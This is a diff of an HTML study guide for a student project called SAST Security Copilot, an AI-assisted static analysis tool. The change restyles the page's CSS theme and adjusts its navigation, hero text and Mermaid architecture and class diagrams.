@@ -1,137 +1,553 @@
 <!DOCTYPE html>
-<html lang="en" data-theme="dark">
+<html lang="en" class="theme-light">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>SAST Security Copilot – Complete VIVA Guide</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Newsreader:ital,opsz,wght@0,6..72,400;1,6..72,400&display=swap" rel="stylesheet">
 <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
 <style>
-:root[data-theme="light"] {
-  --bg: #FFFBF5;
-  --bg2: #FFF7ED;
-  --card: #FFFFFF;
-  --card2: #FEF3C7;
-  --border: #E8D5B7;
-  --text: #1C1917;
-  --text2: #57534E;
-  --accent: #C2410C;
-  --accent2: #D97706;
-  --accent3: #F59E0B;
-  --tag: #FED7AA;
-  --tag-text: #9A3412;
-  --code-bg: #FFF7ED;
-  --nav-bg: rgba(255,251,245,0.95);
-  --shadow: rgba(0,0,0,0.08);
-  --mermaid-theme: default;
+/* ── Geist fonts via CDN ────────────────────────────── */
+@import url('https://cdn.jsdelivr.net/npm/geist@1.3.0/dist/fonts/geist-sans/style.css');
+@import url('https://cdn.jsdelivr.net/npm/geist@1.3.0/dist/fonts/geist-mono/style.css');
+
+/* ── SecNode Console Design Tokens ──────────────────── */
+:root {
+  /* Type */
+  --font-sans: "Geist", ui-sans-serif, system-ui, -apple-system, "Segoe UI", Helvetica, Arial, sans-serif;
+  --font-mono: "Geist Mono", ui-monospace, "SF Mono", Menlo, Consolas, monospace;
+  --font-serif: "Newsreader", "Source Serif 4", Georgia, serif;
+
+  /* Type scale */
+  --text-2xs:11px; --text-xs:12px; --text-sm:13px; --text-base:14px;
+  --text-md:15px;  --text-lg:17px; --text-xl:20px; --text-2xl:24px;
+  --text-3xl:30px; --text-4xl:38px; --text-5xl:48px;
+
+  /* Spacing */
+  --space-1:4px;  --space-2:8px;  --space-3:12px; --space-4:16px;
+  --space-5:20px; --space-6:24px; --space-8:32px; --space-10:40px;
+  --space-12:48px; --space-16:64px;
+
+  /* Radius */
+  --radius-xs:4px; --radius-sm:6px; --radius-md:8px; --radius-lg:10px;
+  --radius-xl:14px; --radius-2xl:18px;
+  --radius:10px;
+
+  /* Shell */
+  --sidebar-w:244px; --topbar-h:52px;
+
+  /* Severity — perceptually balanced, intentionally desaturated */
+  --sev-critical:   oklch(0.55 0.18 25);  --sev-critical-bg: oklch(0.55 0.18 25 / 0.10);
+  --sev-high:       oklch(0.66 0.15 50);  --sev-high-bg:     oklch(0.66 0.15 50 / 0.10);
+  --sev-medium:     oklch(0.78 0.12 85);  --sev-medium-bg:   oklch(0.78 0.12 85 / 0.12);
+  --sev-low:        oklch(0.62 0.07 220); --sev-low-bg:      oklch(0.62 0.07 220 / 0.10);
+  --sev-info:       oklch(0.55 0.10 250); --sev-info-bg:     oklch(0.55 0.10 250 / 0.10);
+  --sev-ok:         oklch(0.58 0.09 160); --sev-ok-bg:       oklch(0.58 0.09 160 / 0.10);
 }
-:root[data-theme="dark"] {
-  --bg: #0C0A09;
-  --bg2: #1C1917;
-  --card: #1C1917;
-  --card2: #292524;
-  --border: #44403C;
-  --text: #FAFAF9;
-  --text2: #A8A29E;
-  --accent: #FB923C;
-  --accent2: #FBBF24;
-  --accent3: #FDE68A;
-  --tag: #431407;
-  --tag-text: #FDBA74;
-  --code-bg: #292524;
-  --nav-bg: rgba(12,10,9,0.95);
-  --shadow: rgba(0,0,0,0.4);
-  --mermaid-theme: dark;
+
+/* ── Light theme ─────────────────────────────────────── */
+:root,
+.theme-light {
+  /* warm paper — chroma pushed to 0.014 so warmth is visible */
+  --bg:            oklch(0.987 0.014 82);
+  --bg-deep:       oklch(0.970 0.016 82);
+  --surface:       oklch(1.000 0.008 82);
+  --surface-2:     oklch(0.978 0.016 82);
+  --surface-3:     oklch(0.964 0.018 82);
+  --surface-inset: oklch(0.948 0.018 82);
+
+  --fg:        oklch(0.18 0.016 75);
+  --fg-strong: oklch(0.09 0.012 75);
+  --fg-muted:  oklch(0.44 0.010 75);
+  --fg-subtle: oklch(0.60 0.008 75);
+  --fg-faint:  oklch(0.76 0.006 75);
+
+  --border:        oklch(0.90 0.012 82);
+  --border-strong: oklch(0.82 0.014 82);
+  --hairline:      oklch(0.93 0.010 82);
+
+  --accent:             oklch(0.45 0.15 255);
+  --accent-fg:          oklch(1 0 0);
+  --accent-soft:        oklch(0.45 0.15 255 / 0.09);
+  --accent-soft-strong: oklch(0.45 0.15 255 / 0.16);
+
+  --shadow-xs: 0 1px 2px oklch(0.18 0.016 75 / 0.06);
+  --shadow-sm: 0 1px 3px oklch(0.18 0.016 75 / 0.06), 0 2px 6px oklch(0.18 0.016 75 / 0.04);
+  --shadow-md: 0 2px 4px oklch(0.18 0.016 75 / 0.06), 0 8px 24px oklch(0.18 0.016 75 / 0.08);
+  --shadow-lg: 0 6px 12px oklch(0.18 0.016 75 / 0.08), 0 20px 48px oklch(0.18 0.016 75 / 0.12);
+
+  --sidebar-bg:     oklch(0.972 0.016 82);
+  --sidebar-fg:     oklch(0.18 0.016 75);
+  --sidebar-border: oklch(0.90 0.012 82);
+  --nav-bg:         oklch(0.987 0.014 82 / 0.92);
+
+  color-scheme: light;
 }
-*{margin:0;padding:0;box-sizing:border-box}
-html{scroll-behavior:smooth}
-body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;line-height:1.7;transition:background .3s,color .3s}
-/* NAV */
-nav{position:sticky;top:0;z-index:100;background:var(--nav-bg);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);padding:0 2rem}
-.nav-inner{max-width:1200px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;height:56px;gap:1rem}
-.nav-brand{font-weight:700;font-size:1.1rem;color:var(--accent);white-space:nowrap}
-.nav-links{display:flex;gap:.2rem;flex-wrap:wrap}
-.nav-links a{color:var(--text2);text-decoration:none;font-size:.78rem;padding:.3rem .6rem;border-radius:6px;transition:.2s}
-.nav-links a:hover{background:var(--card2);color:var(--accent)}
-.theme-btn{background:var(--card2);border:1px solid var(--border);color:var(--text);cursor:pointer;padding:.4rem .9rem;border-radius:20px;font-size:.82rem;display:flex;align-items:center;gap:.4rem;transition:.2s;white-space:nowrap}
-.theme-btn:hover{background:var(--accent);color:#fff;border-color:var(--accent)}
-/* LAYOUT */
-.container{max-width:1100px;margin:0 auto;padding:2.5rem 1.5rem}
-/* HERO */
-.hero{background:linear-gradient(135deg,var(--card2) 0%,var(--card) 100%);border:1px solid var(--border);border-radius:20px;padding:3rem 2.5rem;margin-bottom:3rem;text-align:center;position:relative;overflow:hidden}
-.hero::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse at 70% 30%,rgba(251,146,60,.12),transparent 60%);pointer-events:none}
-.hero h1{font-size:2.4rem;font-weight:800;background:linear-gradient(135deg,var(--accent),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:.5rem}
-.hero p{color:var(--text2);font-size:1.05rem;max-width:700px;margin:.6rem auto 0}
-.badge-row{display:flex;flex-wrap:wrap;gap:.5rem;justify-content:center;margin-top:1.4rem}
-.badge{padding:.3rem .8rem;border-radius:20px;font-size:.75rem;font-weight:600;background:var(--tag);color:var(--tag-text);border:1px solid var(--border)}
-/* SECTIONS */
-section{margin-bottom:3.5rem}
-.section-title{font-size:1.65rem;font-weight:700;color:var(--accent);margin-bottom:1.2rem;padding-bottom:.6rem;border-bottom:2px solid var(--border);display:flex;align-items:center;gap:.6rem}
-.section-title span.num{background:linear-gradient(135deg,var(--accent),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;font-size:1.8rem}
-.subsection{margin-bottom:1.8rem}
-.subsection h3{font-size:1.15rem;font-weight:600;color:var(--accent2);margin-bottom:.7rem;display:flex;align-items:center;gap:.5rem}
-.subsection h3::before{content:'▸';color:var(--accent)}
-/* CARDS */
-.card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:1.5rem;margin-bottom:1rem;box-shadow:0 2px 12px var(--shadow)}
-.card-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:1rem;margin-bottom:1rem}
-.card h4{font-size:1rem;font-weight:600;color:var(--accent2);margin-bottom:.5rem}
-.card p,.card li{color:var(--text2);font-size:.9rem}
-.card ul{padding-left:1.2rem}
-.card li{margin-bottom:.25rem}
-/* TERM CARDS */
-.term-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:.8rem}
-.term-card{background:var(--card);border:1px solid var(--border);border-left:4px solid var(--accent);border-radius:10px;padding:1.1rem 1.3rem}
-.term-card .term{font-weight:700;color:var(--accent);font-size:.95rem}
-.term-card .full{color:var(--text2);font-size:.78rem;margin-bottom:.4rem}
-.term-card .def{color:var(--text);font-size:.88rem}
-/* DIAGRAM BOX */
-.diagram-box{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:1.5rem;margin-bottom:1.5rem;overflow-x:auto}
-.diagram-box h4{color:var(--accent2);font-size:1rem;font-weight:600;margin-bottom:1rem;padding-bottom:.5rem;border-bottom:1px solid var(--border)}
-.diagram-explain{background:var(--card2);border-radius:10px;padding:1rem 1.2rem;margin-top:1rem;border-left:3px solid var(--accent2)}
-.diagram-explain p{color:var(--text2);font-size:.88rem;margin-bottom:.4rem}
-.diagram-explain strong{color:var(--text)}
-/* CODE */
-code{background:var(--code-bg);color:var(--accent);font-family:'Cascadia Code','Fira Code',monospace;font-size:.85rem;padding:.15rem .4rem;border-radius:5px;border:1px solid var(--border)}
-pre{background:var(--code-bg);border:1px solid var(--border);border-radius:10px;padding:1.2rem;overflow-x:auto;margin:.8rem 0}
-pre code{background:none;border:none;padding:0;color:var(--accent3);font-size:.85rem}
-/* TABLE */
-table{width:100%;border-collapse:collapse;margin:.8rem 0;font-size:.88rem}
-th{background:var(--card2);color:var(--accent2);font-weight:600;padding:.6rem .9rem;text-align:left;border-bottom:2px solid var(--border)}
-td{padding:.55rem .9rem;border-bottom:1px solid var(--border);color:var(--text2);vertical-align:top}
-tr:hover td{background:var(--card2)}
-/* SEVERITY */
-.sev{display:inline-block;padding:.15rem .6rem;border-radius:12px;font-size:.75rem;font-weight:700}
-.sev-critical{background:#450A0A;color:#F87171}
-.sev-high{background:#431407;color:#FB923C}
-.sev-medium{background:#422006;color:#FCD34D}
-.sev-low{background:#052E16;color:#4ADE80}
-.sev-info{background:#0C1A3A;color:#60A5FA}
-/* QA */
-.qa-block{background:var(--card);border:1px solid var(--border);border-radius:12px;margin-bottom:.8rem;overflow:hidden}
-.qa-q{padding:1rem 1.3rem;font-weight:600;cursor:pointer;display:flex;justify-content:space-between;align-items:center;color:var(--accent2);transition:.2s}
-.qa-q:hover{background:var(--card2)}
-.qa-q::after{content:'▾';font-size:1.1rem;color:var(--accent);transition:.2s}
-.qa-a{padding:0 1.3rem 1rem;color:var(--text2);font-size:.9rem;line-height:1.7;display:none}
-.qa-block.open .qa-q::after{content:'▴'}
-.qa-block.open .qa-a{display:block}
-/* FLOW VISUAL */
-.flow{display:flex;align-items:center;flex-wrap:wrap;gap:.4rem;margin:.8rem 0}
-.flow-step{background:var(--card2);border:1px solid var(--border);border-radius:8px;padding:.4rem .9rem;font-size:.82rem;color:var(--text);font-weight:500}
-.flow-arrow{color:var(--accent);font-weight:700;font-size:1.1rem}
-.flow-step.active{background:var(--accent);color:#fff;border-color:var(--accent)}
-/* HIGHLIGHT */
-.highlight{background:linear-gradient(135deg,var(--tag),transparent);border:1px solid var(--border);border-radius:10px;padding:1rem 1.2rem;margin:.8rem 0}
-.highlight strong{color:var(--accent)}
-/* MERMAID */
-.mermaid{min-height:80px}
-/* RESPONSIVE */
-@media(max-width:768px){
-  .hero h1{font-size:1.7rem}
-  .nav-links{display:none}
-  .card-grid{grid-template-columns:1fr}
-  .term-grid{grid-template-columns:1fr}
+
+/* ── Dark theme ──────────────────────────────────────── */
+.theme-dark {
+  /* warm charcoal — chroma pushed to 0.016 */
+  --bg:            oklch(0.148 0.016 78);
+  --bg-deep:       oklch(0.118 0.016 78);
+  --surface:       oklch(0.188 0.015 78);
+  --surface-2:     oklch(0.210 0.014 78);
+  --surface-3:     oklch(0.232 0.013 78);
+  --surface-inset: oklch(0.168 0.015 78);
+
+  --fg:        oklch(0.955 0.010 82);
+  --fg-strong: oklch(0.990 0.005 82);
+  --fg-muted:  oklch(0.680 0.010 78);
+  --fg-subtle: oklch(0.520 0.010 78);
+  --fg-faint:  oklch(0.380 0.010 78);
+
+  --border:        oklch(0.290 0.014 78);
+  --border-strong: oklch(0.370 0.014 78);
+  --hairline:      oklch(0.240 0.013 78);
+
+  --accent:             oklch(0.74 0.14 252);
+  --accent-fg:          oklch(0.10 0.01 252);
+  --accent-soft:        oklch(0.74 0.14 252 / 0.13);
+  --accent-soft-strong: oklch(0.74 0.14 252 / 0.22);
+
+  --shadow-xs: 0 1px 2px oklch(0 0 0 / 0.50);
+  --shadow-sm: 0 2px 4px oklch(0 0 0 / 0.40), 0 1px 2px oklch(0 0 0 / 0.30);
+  --shadow-md: 0 2px 4px oklch(0 0 0 / 0.40), 0 10px 24px oklch(0 0 0 / 0.38);
+  --shadow-lg: 0 8px 16px oklch(0 0 0 / 0.45), 0 28px 56px oklch(0 0 0 / 0.55);
+
+  --sidebar-bg:     oklch(0.128 0.015 78);
+  --sidebar-fg:     oklch(0.920 0.008 82);
+  --sidebar-border: oklch(0.240 0.013 78);
+  --nav-bg:         oklch(0.148 0.016 78 / 0.92);
+
+  /* Severity — brighter for dark bg */
+  --sev-critical:   oklch(0.72 0.19 25);  --sev-critical-bg: oklch(0.72 0.19 25 / 0.15);
+  --sev-high:       oklch(0.80 0.16 55);  --sev-high-bg:     oklch(0.80 0.16 55 / 0.14);
+  --sev-medium:     oklch(0.86 0.13 85);  --sev-medium-bg:   oklch(0.86 0.13 85 / 0.14);
+  --sev-low:        oklch(0.76 0.09 225); --sev-low-bg:      oklch(0.76 0.09 225 / 0.14);
+  --sev-info:       oklch(0.76 0.11 250); --sev-info-bg:     oklch(0.76 0.11 250 / 0.14);
+  --sev-ok:         oklch(0.74 0.10 160); --sev-ok-bg:       oklch(0.74 0.10 160 / 0.14);
+
+  color-scheme: dark;
 }
-/* PRINT */
-@media print{nav{display:none}.hero{page-break-after:always}}
+
+/* ═══════════════════════════════════════════════════════
+   BASE
+═══════════════════════════════════════════════════════ */
+*, *::before, *::after { margin:0; padding:0; box-sizing:border-box }
+html { scroll-behavior:smooth; -webkit-text-size-adjust:100% }
+body {
+  background: var(--bg);
+  color: var(--fg);
+  font-family: var(--font-sans);
+  font-size: 15px;
+  line-height: 1.6;
+  letter-spacing: -0.007em;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+  font-feature-settings: "ss01","cv11","liga";
+  transition: background .3s ease, color .3s ease;
+}
+
+/* ═══════════════════════════════════════════════════════
+   NAV
+═══════════════════════════════════════════════════════ */
+nav {
+  position: sticky; top: 0; z-index: 100;
+  background: var(--nav-bg);
+  backdrop-filter: blur(14px) saturate(160%);
+  -webkit-backdrop-filter: blur(14px) saturate(160%);
+  border-bottom: 1px solid var(--hairline);
+  padding: 0 2rem;
+  height: 56px;
+}
+.nav-inner {
+  max-width: 1160px; margin: 0 auto;
+  display: flex; align-items: center; justify-content: space-between;
+  height: 56px; gap: 1rem;
+}
+.nav-brand {
+  font-size: 13px; font-weight: 650;
+  color: var(--fg-strong);
+  letter-spacing: -0.015em;
+  white-space: nowrap;
+}
+.nav-links { display:flex; gap:.05rem; flex-wrap:wrap }
+.nav-links a {
+  color: var(--fg-subtle);
+  text-decoration: none;
+  font-size: 13px;
+  padding: .3rem .6rem;
+  border-radius: 6px;
+  transition: background .12s, color .12s;
+  letter-spacing: -0.005em;
+}
+.nav-links a:hover { background: var(--surface-2); color: var(--fg) }
+.theme-btn {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  color: var(--fg-muted);
+  cursor: pointer;
+  padding: 5px 12px;
+  border-radius: 7px;
+  font-size: 12px; font-weight: 500;
+  display: flex; align-items: center; gap: .4rem;
+  transition: .12s; white-space: nowrap;
+  font-family: inherit;
+  box-shadow: var(--shadow-xs);
+}
+.theme-btn:hover { border-color: var(--border-strong); background: var(--surface-2); color: var(--fg) }
+
+/* ═══════════════════════════════════════════════════════
+   LAYOUT
+═══════════════════════════════════════════════════════ */
+.container { max-width: 1100px; margin: 0 auto; padding: 3rem 2rem }
+
+/* ═══════════════════════════════════════════════════════
+   HERO
+═══════════════════════════════════════════════════════ */
+.hero {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 20px;
+  padding: 4.5rem 3.5rem;
+  margin-bottom: 4rem;
+  text-align: center;
+  position: relative; overflow: hidden;
+  box-shadow: var(--shadow-lg);
+}
+.hero::before {
+  content: '';
+  position: absolute; inset: 0; pointer-events: none;
+  background:
+    radial-gradient(ellipse 90% 55% at 50% -5%, oklch(0.78 0.12 85 / 0.18), transparent 70%),
+    radial-gradient(ellipse 50% 40% at 100% 110%, oklch(0.45 0.15 255 / 0.10), transparent 60%);
+}
+.hero h1 {
+  font-family: var(--font-serif);
+  font-size: clamp(2rem, 5vw, 3.25rem);
+  font-weight: 700;
+  line-height: 1.1;
+  letter-spacing: -0.03em;
+  color: var(--fg-strong);
+  margin-bottom: .75rem;
+  position: relative;
+}
+.hero h1 span { color: var(--accent); font-style: italic }
+.hero > p {
+  color: var(--fg-muted);
+  font-size: 1rem;
+  max-width: 620px; margin: .875rem auto 0;
+  line-height: 1.75;
+  position: relative;
+}
+.badge-row {
+  display: flex; flex-wrap: wrap; gap: .4rem;
+  justify-content: center; margin-top: 2rem;
+  position: relative;
+}
+.badge {
+  padding: 4px 11px;
+  border-radius: 6px;
+  font-size: 11px; font-weight: 500;
+  background: var(--surface-2);
+  color: var(--fg-muted);
+  border: 1px solid var(--border);
+  font-family: var(--font-mono);
+  letter-spacing: .01em;
+}
+
+/* ═══════════════════════════════════════════════════════
+   SECTIONS
+═══════════════════════════════════════════════════════ */
+section { margin-bottom: 4.5rem }
+
+.section-title {
+  font-family: var(--font-serif);
+  font-size: clamp(1.4rem, 3vw, 1.9rem);
+  font-weight: 700;
+  line-height: 1.15;
+  color: var(--fg-strong);
+  letter-spacing: -0.025em;
+  margin-bottom: 1.75rem;
+  padding-bottom: .875rem;
+  border-bottom: 1px solid var(--border);
+  display: flex; align-items: baseline; gap: .75rem;
+}
+.section-title span.num {
+  font-family: var(--font-mono);
+  font-size: .875rem; font-weight: 600;
+  color: var(--accent);
+  letter-spacing: .02em;
+  flex-shrink: 0;
+}
+
+.subsection { margin-bottom: 2.25rem }
+.subsection h3 {
+  font-size: 11px; font-weight: 600;
+  color: var(--fg-subtle);
+  text-transform: uppercase; letter-spacing: .09em;
+  margin-bottom: 1rem;
+  display: flex; align-items: center; gap: .6rem;
+}
+.subsection h3::before {
+  content: '';
+  display: inline-block;
+  width: 18px; height: 1.5px;
+  background: var(--accent);
+  flex-shrink: 0; border-radius: 2px;
+}
+
+/* ═══════════════════════════════════════════════════════
+   CARDS
+═══════════════════════════════════════════════════════ */
+.card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-lg);
+  padding: 20px 22px;
+  margin-bottom: 1rem;
+  box-shadow: var(--shadow-xs);
+  transition: box-shadow .2s, border-color .2s;
+}
+.card:hover { box-shadow: var(--shadow-sm); border-color: var(--border-strong) }
+
+.card-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+  gap: .75rem; margin-bottom: 1rem;
+}
+
+.card h4 {
+  font-size: 13px; font-weight: 650;
+  color: var(--fg-strong); margin-bottom: .625rem;
+  letter-spacing: -0.01em;
+}
+.card p, .card li { color: var(--fg-muted); font-size: .9rem; line-height: 1.65 }
+.card ul { padding-left: 1.1rem }
+.card li { margin-bottom: .3rem }
+
+/* ═══════════════════════════════════════════════════════
+   TERM CARDS
+═══════════════════════════════════════════════════════ */
+.term-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+  gap: .6rem;
+}
+.term-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-top: 2.5px solid var(--accent);
+  border-radius: var(--radius-md);
+  padding: 14px 16px;
+  transition: box-shadow .2s;
+}
+.term-card:hover { box-shadow: var(--shadow-sm) }
+.term-card .term {
+  font-weight: 650; color: var(--fg-strong);
+  font-size: 14px; letter-spacing: -0.01em;
+  margin-bottom: .25rem;
+}
+.term-card .full {
+  color: var(--accent); font-size: 11px; font-weight: 600;
+  text-transform: uppercase; letter-spacing: .07em;
+  margin-bottom: .5rem; display: block;
+}
+.term-card .def { color: var(--fg-muted); font-size: .875rem; line-height: 1.6 }
+
+/* ═══════════════════════════════════════════════════════
+   DIAGRAM BOXES
+═══════════════════════════════════════════════════════ */
+.diagram-box {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-lg);
+  overflow: hidden;
+  margin-bottom: 2rem;
+  box-shadow: var(--shadow-sm);
+}
+.diagram-box h4 {
+  color: var(--fg-subtle);
+  font-family: var(--font-mono);
+  font-size: 11px; font-weight: 600;
+  letter-spacing: .07em; text-transform: uppercase;
+  padding: 11px 18px;
+  border-bottom: 1px solid var(--hairline);
+  background: var(--surface-2);
+}
+.diagram-box > .mermaid {
+  padding: 2rem 2.5rem;
+  background: var(--surface);
+  overflow-x: auto;
+}
+.diagram-explain {
+  background: var(--surface-2);
+  padding: 14px 18px;
+  border-top: 1px solid var(--hairline);
+  border-left: 3px solid var(--accent);
+}
+.diagram-explain p { color: var(--fg-muted); font-size: .875rem; line-height: 1.65; margin-bottom: .35rem }
+.diagram-explain strong { color: var(--fg-strong); font-weight: 600 }
+
+/* ═══════════════════════════════════════════════════════
+   CODE
+═══════════════════════════════════════════════════════ */
+code {
+  background: var(--surface-inset);
+  color: var(--fg-strong);
+  font-family: var(--font-mono);
+  font-size: .8rem;
+  padding: .15rem .4rem;
+  border-radius: var(--radius-xs);
+  border: 1px solid var(--border);
+}
+pre {
+  background: var(--surface-inset);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-md);
+  padding: 16px 20px;
+  overflow-x: auto;
+  margin: 1rem 0;
+}
+pre code {
+  background: none; border: none; padding: 0;
+  color: var(--fg); font-size: .8rem; line-height: 1.75;
+}
+
+/* ═══════════════════════════════════════════════════════
+   TABLE
+═══════════════════════════════════════════════════════ */
+table { width: 100%; border-collapse: collapse; margin: 1rem 0; font-size: .875rem }
+thead { background: var(--surface-2) }
+th {
+  color: var(--fg-subtle);
+  font-size: 11px; font-weight: 600;
+  text-transform: uppercase; letter-spacing: .08em;
+  padding: 10px 14px; text-align: left;
+  border-bottom: 1px solid var(--border);
+  font-family: var(--font-mono);
+}
+td {
+  padding: 10px 14px;
+  border-bottom: 1px solid var(--hairline);
+  color: var(--fg-muted);
+  vertical-align: top;
+  line-height: 1.55;
+}
+tr:last-child td { border-bottom: none }
+tr:hover td { background: var(--surface-2) }
+
+/* ═══════════════════════════════════════════════════════
+   SEVERITY PILLS
+═══════════════════════════════════════════════════════ */
+.sev {
+  display: inline-block;
+  padding: 2px 7px;
+  border-radius: 4px;
+  font-size: 11px; font-weight: 650;
+  font-family: var(--font-mono);
+  letter-spacing: .03em;
+}
+.sev-critical { color: var(--sev-critical); background: var(--sev-critical-bg) }
+.sev-high     { color: var(--sev-high);     background: var(--sev-high-bg) }
+.sev-medium   { color: var(--sev-medium);   background: var(--sev-medium-bg) }
+.sev-low      { color: var(--sev-low);      background: var(--sev-low-bg) }
+.sev-info     { color: var(--sev-info);     background: var(--sev-info-bg) }
+
+/* ═══════════════════════════════════════════════════════
+   Q&A ACCORDION
+═══════════════════════════════════════════════════════ */
+.qa-block {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-lg);
+  margin-bottom: .5rem;
+  overflow: hidden;
+  transition: border-color .2s;
+}
+.qa-q {
+  padding: 14px 18px;
+  font-weight: 500; font-size: 14px;
+  cursor: pointer;
+  display: flex; justify-content: space-between; align-items: center;
+  color: var(--fg); transition: background .12s;
+  line-height: 1.45; gap: 1rem;
+}
+.qa-q:hover { background: var(--surface-2) }
+.qa-q::after {
+  content: '+';
+  font-size: 20px; line-height: 1; font-weight: 300;
+  color: var(--fg-subtle);
+  transition: transform .2s, color .2s;
+  flex-shrink: 0;
+}
+.qa-a {
+  padding: 14px 18px;
+  color: var(--fg-muted);
+  font-size: .9rem; line-height: 1.75;
+  display: none;
+  border-top: 1px solid var(--hairline);
+}
+.qa-block.open { border-color: var(--border-strong) }
+.qa-block.open .qa-q { color: var(--fg-strong); background: var(--surface-2) }
+.qa-block.open .qa-q::after { content: '−'; color: var(--accent) }
+.qa-block.open .qa-a { display: block }
+
+/* ═══════════════════════════════════════════════════════
+   FLOW PIPELINE
+═══════════════════════════════════════════════════════ */
+.flow { display: flex; align-items: center; flex-wrap: wrap; gap: .35rem; margin: 1.25rem 0 }
+.flow-step {
+  background: var(--surface-2);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-sm);
+  padding: 5px 11px;
+  font-size: .78rem; font-weight: 500;
+  color: var(--fg-muted);
+  font-family: var(--font-mono);
+  letter-spacing: .01em;
+}
+.flow-arrow { color: var(--fg-faint); font-size: .85rem; padding: 0 1px }
+.flow-step.active {
+  background: var(--accent-soft);
+  color: var(--accent);
+  border-color: var(--accent-soft-strong);
+  font-weight: 600;
+}
+
+/* ═══════════════════════════════════════════════════════
+   CALLOUT / HIGHLIGHT
+═══════════════════════════════════════════════════════ */
+.highlight {
+  background: var(--surface-2);
+  border: 1px solid var(--border);
+  border-left: 3px solid var(--accent);
+  border-radius: 0 var(--radius-md) var(--radius-md) 0;
+  padding: 14px 18px; margin: 1.25rem 0;
+}
+.highlight strong { color: var(--fg-strong) }
+.highlight p { color: var(--fg-muted); font-size: .9rem; line-height: 1.65 }
+
+/* ═══════════════════════════════════════════════════════
+   MERMAID
+═══════════════════════════════════════════════════════ */
+.mermaid { min-height: 80px }
+
+/* ═══════════════════════════════════════════════════════
+   RESPONSIVE
+═══════════════════════════════════════════════════════ */
+@media (max-width: 768px) {
+  .hero { padding: 2.5rem 1.5rem }
+  .nav-links { display: none }
+  .card-grid { grid-template-columns: 1fr }
+  .term-grid { grid-template-columns: 1fr }
+  .container { padding: 2rem 1rem }
+  .section-title { font-size: 1.4rem }
+  .diagram-box > .mermaid { padding: 1rem }
+}
+@media print { nav { display:none } .hero { page-break-after:always } }
 </style>
 </head>
 <body>
@@ -150,6 +566,12 @@ tr:hover td{background:var(--card2)}
       <a href="#ai">AI Engine</a>
       <a href="#api">API</a>
       <a href="#db">Database</a>
+      <a href="#cvss">CVSS</a>
+      <a href="#secure-code">Secure Code</a>
+      <a href="#comparison">SAST vs DAST</a>
+      <a href="#glossary">Glossary</a>
+      <a href="#whynot">Why Not X</a>
+      <a href="#dataflow">Data Flow</a>
       <a href="#viva">VIVA Q&amp;A</a>
     </div>
     <button class="theme-btn" onclick="toggleTheme()">☀️ Light</button>
@@ -160,15 +582,15 @@ tr:hover td{background:var(--card2)}
 
 <!-- HERO -->
 <div class="hero">
-  <h1>🛡️ SAST Security Copilot</h1>
-  <p>AI-Powered Static Application Security Testing Platform — Complete VIVA Guide covering Cybersecurity concepts, system design, architecture diagrams, and expected exam questions.</p>
+  <h1><span>SAST</span> Security Copilot</h1>
+  <p>AI-Powered Static Application Security Testing Platform — Complete VIVA Guide covering cybersecurity fundamentals, system architecture, UML diagrams, tech stack, and exam Q&amp;A.</p>
   <div class="badge-row">
     <span class="badge">Node.js + TypeScript</span>
     <span class="badge">React + Vite</span>
     <span class="badge">PostgreSQL + Redis</span>
     <span class="badge">NVIDIA NIM · Gemini · OpenAI</span>
     <span class="badge">Docker</span>
-    <span class="badge">GitHub OAuth</span>
+    <span class="badge">GitHub OAuth2</span>
     <span class="badge">Bull Queue</span>
     <span class="badge">Prisma ORM</span>
   </div>
@@ -457,12 +879,12 @@ tr:hover td{background:var(--card2)}
   <div class="mermaid">
 graph TB
     User["👤 Developer"]
-    subgraph FE["Frontend · React/Vite · :5173"]
+    subgraph FE["Frontend - React/Vite - port 5173"]
         UI["React SPA"]
         Store["Zustand Store"]
         QC["TanStack Query Cache"]
     end
-    subgraph BE["Backend · Express/Node.js · :3001"]
+    subgraph BE["Backend - Express/Node.js - port 3001"]
         API["REST API + SSE"]
         Auth["Auth Module\n(Passport · JWT)"]
         Proj["Projects Module"]
@@ -634,7 +1056,7 @@ flowchart TD
     H -- No --> I["Send to AI Provider\nNVIDIA first"]
     I --> J{AI responded?}
     J -- Yes --> K["Save findings to DB"]
-    J -- No → try next --> I2["Try Gemini\nthen OpenAI"]
+    J -- "No, try next" --> I2["Try Gemini\nthen OpenAI"]
     I2 --> J2{Responded?}
     J2 -- Yes --> K
     J2 -- No --> Log["Log: all providers failed"]
@@ -660,15 +1082,15 @@ classDiagram
         +String username
         +String email
         +DateTime createdAt
-        +Project[] projects
-        +Scan[] scans
+        +List~Project~ projects
+        +List~Scan~ scans
     }
     class Project {
         +String id
         +String name
         +String repoUrl
         +String userId
-        +Scan[] scans
+        +List~Scan~ scans
     }
     class Scan {
         +String id
@@ -679,7 +1101,7 @@ classDiagram
         +Int totalIssues
         +Int criticalCount
         +String userId
-        +Issue[] issues
+        +List~Issue~ issues
     }
     class Issue {
         +String id
@@ -696,13 +1118,13 @@ classDiagram
         +Boolean aiProcessed
     }
     class AiService {
